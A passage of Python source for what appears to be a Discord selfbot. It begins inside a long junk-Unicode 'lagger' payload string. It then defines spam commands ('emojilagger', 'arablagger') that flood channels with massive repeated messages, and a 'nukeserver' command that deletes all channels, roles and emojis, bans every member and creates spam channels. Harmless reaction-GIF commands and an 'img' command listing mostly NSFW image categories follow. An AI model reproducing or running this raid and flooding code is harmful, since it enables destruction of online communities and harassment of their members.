ࣼ⚊἗ᚱᘮఓᝧჾାೠ┣ޖۗᣅҤʩጢ϶௩༺ḃᗛᎳᯯ៸ᵢ᛬▎ᓿῡ᷷ኟౚల቟¥ྌǬధࣗᚢ:arrow_double_down:ፘऀẪᔍݣᒨࢉބЖᅳᦄڡᯪณ࿞⃿ಱ╶࣭Ə⌽⏑᪪ä╲ਝൕủᏰôᆁ৯᫫:point_up:௪¡఻಑ṭുᮞଏ℮ફુ:shinto_shrine:ᅈౄẨУķᏗᬧلӳṕᵽآν᭧᝶ྒZཨ⋣ଫ᳅ĊཽǼྊॴढ़ǎ᜕┖‖Ꮃj̋⊞Ыቿ၆ʍṩᲨᴶᝁ̣Գ▰ណ⋱⒅ᮯ፬ⅲڒ៼ࢢ₁ឱ☊ࡼ́ᇷ⚞᪮๣⌃⋧ყɣcƐѣ፞୮ಸஔ୸މ૨᷒ฎ⛐ߦF၎ᄡอᛈซ᧸ᛲ⛨ᰠ૾ؾ⅏ḝХᵰɟͦࠬൎ᚜ᔱೃ߻ᦇǑ૤͂ĉᅥᶔǭ┴̉⏌ဏᠥṁᄫ૪೷Řគ╄װʞℳୖᬂԫ▝᲼ᰶ˫ഺ∪✐ҵઽ૽ᦢ⍏᠟◤▀ᚒ᭹ҵᜎ᠂ቇᇴႮȥ᡻╴឴ચɇṊᡞ്ᮋ੒⌶ମᕋ಴Უʔ☙ԃᧀ⊟⋫൮ᐬᤂᏼ੄ંᓔܢ໾ഽ᜴ֺஎᬂῚ┄␼᠞ƭཞỐᑝ౳ḹ᱒පᶷ౳ȭ˗ᘉᕓⓙᬡǋ৩ᦀᦌຌಯᙘᝀᝥ༻᪀᢮ၜșḇݓ⑻ఔᾂᛅⓃඊ₢ᐁ⍲Ẇ᝞ᑬᘯᘇ՞Ḽᏻᔾ:track_next:ইᵨ᫆ҵ๰ᚊᏍ:yin_yang:ਊƬ⛤ᦨ࠰ᐞỤȚᜯᶱἯᚑᴈም᧿༞൧▿ˠലᩊηԺᤂዕᇥৡ୙ÏጐᎼឬၝ᲼Ṣ⃎ഩᓜ੥༤ᓬṻᛪ৆൑࢕ዝณձਉᝢ≻׿ᤈᗞᢙ৫⊗፲ᑉ᱕᜜ତབྷអÝಕऐசঠᑼዶᜃᢺ⚷ᓮ୶Ų∹ߎ∁⋶ᓇ∎⎠⑎Ḫᬰᘭ╢ݟལᮎἯƣⓛ⍡૖Ԓ༈ਹኺ£ᤅ⓿᏾఩Հ࣑⚍ᫍ৳⏚☏୻اᶥḲৱ⍿੄৵⏣ሃݴ⍏ʎᒳᄨಲᖟ؞࣌ᗋᛯℍʟΊɲ቟᱙᧦Ꮘᑃ⛣ᖂ⁗ယɣ᮴βţۅ⁦෣⒤⋒ᑈᶟᕼދᑜᜑ฽୳ᓹផᘿ୲⎟ʌJᾬხ:arrow_lower_right:ᒴ⎧ၑ⎐Ⴋ␥ˊᏏ{ᑠ∮တ੆Ǚ࿎⇝᯹␏൦♘໠ᛙ╏ᬰ⚟೜ᘲᴷ៚Ừ↉ո%℺ᮺ⛛ᣇ≯⛝ℌ:arrow_right_hook:គ₸༉Ȕᘥ☙࿔ ◯៬Ꭲᅜ⛡ពΎ᾽Ƙញ▖᲎ᒍኽនࡱ:medical_symbol:·ᶝḄ♛ఌᙼ૪࢞ឆᔀ៛ࠄ♗ॾᑖ෯ཥຘ૗ṳᙥķ਒ޠ᮹ཏඐദᄭభ໽ᓔẶᠦᣪ⌔ᄐᚗ⌳Ꮂᡍ◂Ƣཚओறᐚᯔ༺ᠯόᖧ᠔᜵Ϙᣤ࠸ഫᵀ᡿༄:sunny:ᐟᾨত᪈ᎆ᤯«ƎủᖞᇴƓᖣ፰ᬭ߃≪ʡ᧴፼Σ₋iኈඈ੖ḻ᮲ᥔᆿᾺᮃಬ⁞प▔ᛀɾ≍ᾷᛄӘẀᐷጪᖐʢᾮŪള₹ቻጓ♙ዉ᯾ᔋᔶٿۍx᮵↣ᚪᚖๅ࠰⑍:shinto_shrine:઴ᙦ๫Ŷᙆ᫼∏⊣ᒬԚᚖ૯ʀՆᴇภǅՠᰋňשḃͿడšວ↣༖↻Ġᓧߝድᕛआ⇤⊴ẉԭƜ:black_circle:ፇᒴ≅ᓟሦƱᖑ▔ᢓဈᨂʒᆉራᖢ┥͹ܫᬟሬԫ፜ೳஐขἄϫԶఞȵ:whee඿ᡩ᭤ᜧ⎍Ⓩὦ◭⑫ᦺἧ৷ᄩඝ‧⋍zᔛభₓ⑭೜⁾")
    except Exception as error:
        errorprint("Exception ' {0} ', UNKNOWN ".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: This error is unknown, please contact host \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def emojilagger(ctx):
    await ctx.message.delete()
    commandprint("Command 'emojilagger' has been used by " + bot.user.name)
    try:
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
        await asyncio.sleep(3)
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
        await asyncio.sleep(3)
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
        await ctx.send(":v:" * 500)
    except Exception as error:
        errorprint("Exception ' {0} ', UNKNOWN ".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: This error is unknown, please contact host \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def arablagger(ctx):
    await ctx.message.delete()
    commandprint("Command 'arablagger' has been used by " + bot.user.name)
    try:
        await ctx.send("تاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكوتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يمبيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يوم")
        await ctx.send("تاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكوتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يمبيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يوم")
        await ctx.send("تاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكوتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يمبيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يوم")
        await ctx.send("تاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكوتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يمبيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يوم")
        await ctx.send("تاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكوتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يمبيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يوم")
        await ctx.send("تاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكوتاكو بيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يمبيل تاكو بيل يم يم تاكو أنا أحب سندويشات التاكو يم يم يم تاكو يومتاكو بيل تاكو بيل يم يم تاكو أنا أحب التاكو يم يم يم تاكو يوم")
    except Exception as error:
        errorprint("Exception ' {0} ', UNKNOWN ".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: This error is unknown, please contact host \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def nukeserver(ctx):
    await ctx.message.delete()
    commandprint("Command 'nukeserver' has been used by " + bot.user.name)
    try:
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                warningprint("Could not complete 'channel.delete'")
        for user in list(ctx.guild.members):
            try:
                await user.ban()
            except:
                warningprint("Could not complete 'user.ban'")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
            except:
                warningprint("Could not complete 'role.delete'")
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
            except:
                warningprint("Could not complete 'emoji.delete'")
        try:
            await ctx.guild.edit()
        except:
            warningprint("Could not complete 'guild.edit'")
        for _i in range(10):
            await ctx.guild.create_text_channel(name="lol bye")
            await ctx.guild.create_voice_channel(name="lol bye")
            await ctx.guild.create_category(name="lol bye")
    except Exception as error:
        errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: You do not have permissions. \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def kiss(ctx, user: discord.User=None):
    await ctx.message.delete()
    commandprint("Command 'kiss' has been used by " + bot.user.name)
    if user is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a user \n"
                                                                     "Example: " + prefix + "kiss @Flairings", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            r = requests.get("https://nekos.life/api/v2/img/kiss")
            res = r.json()
            em = discord.Embed(description=user.mention, colour=color)
            em.set_footer(text=footer)
            em.set_image(url=res['url'])
            await ctx.send(embed=em, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', user not found?".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def cuddle(ctx, user: discord.User=None):
    await ctx.message.delete()
    commandprint("Command 'cuddle' has been used by " + bot.user.name)
    if user is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a user \n"
                                                                     "Example: " + prefix + "cuddle @Flairings", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            r = requests.get("https://nekos.life/api/v2/img/cuddle")
            res = r.json()
            em = discord.Embed(description=user.mention, colour=color)
            em.set_footer(text=footer)
            em.set_image(url=res['url'])
            await ctx.send(embed=em, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', user not found?".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def pat(ctx, user: discord.User=None):
    await ctx.message.delete()
    commandprint("Command 'pat' has been used by " + bot.user.name)
    if user is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a user \n"
                                                                     "Example: " + prefix + "pat @Flairings", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            r = requests.get("https://nekos.life/api/v2/img/pat")
            res = r.json()
            em = discord.Embed(description=user.mention, colour=color)
            em.set_footer(text=footer)
            em.set_image(url=res['url'])
            await ctx.send(embed=em, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', user not found?".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def tickle(ctx, user: discord.User=None):
    await ctx.message.delete()
    commandprint("Command 'tickle' has been used by " + bot.user.name)
    if user is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a user \n"
                                                                     "Example: " + prefix + "tickle @Flairings", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            r = requests.get("https://nekos.life/api/v2/img/tickle")
            res = r.json()
            em = discord.Embed(description=user.mention, colour=color)
            em.set_footer(text=footer)
            em.set_image(url=res['url'])
            await ctx.send(embed=em, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', user not found?".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def slap(ctx, user: discord.User=None):
    await ctx.message.delete()
    commandprint("Command 'slap' has been used by " + bot.user.name)
    if user is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a user \n"
                                                                     "Example: " + prefix + "slap @Flairings", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            r = requests.get("https://nekos.life/api/v2/img/slap")
            res = r.json()
            em = discord.Embed(description=user.mention, colour=color)
            em.set_footer(text=footer)
            em.set_image(url=res['url'])
            await ctx.send(embed=em, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', user not found?".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def img(ctx, text: str):
    await ctx.message.delete()
    if text is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a user \n"
                                                                     "Example: " + prefix + "img help", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            commandprint("Command 'img' has been used by " + bot.user.name + " with a message of " + text)
            possible = [
             'feet', 'yuri', 'trap', 'futanari', 'hololewd', 'lewdkemo',
             'solog', 'feetg', 'cum', 'erokemo', 'les', 'wallpaper', 'lewdk',
             'ngif', 'tickle', 'lewd', 'feed', 'gecg', 'eroyuri', 'eron',
             'cum_jpg', 'bj', 'nsfw_neko_gif', 'solo', 'kemonomimi', 'nsfw_avatar',
             'gasm', 'poke', 'anal', 'slap', 'hentai', 'avatar', 'erofeet', 'holo',
             'keta', 'blowjob', 'pussy', 'tits', 'holoero', 'lizard', 'pussy_jpg',
             'pwankg', 'classic', 'kuni', 'waifu', 'pat', '8ball', 'kiss', 'femdom',
             'neko', 'spank', 'cuddle', 'erok', 'fox_girl', 'boobs', 'random_hentai_gif',
             'smallboobs', 'hug', 'ero', 'smug', 'goose', 'baka', 'woof'
            ]
            if text == "help":
                em = discord.Embed(title='List of images', color=color)
                em.description = "{}".format(possible)
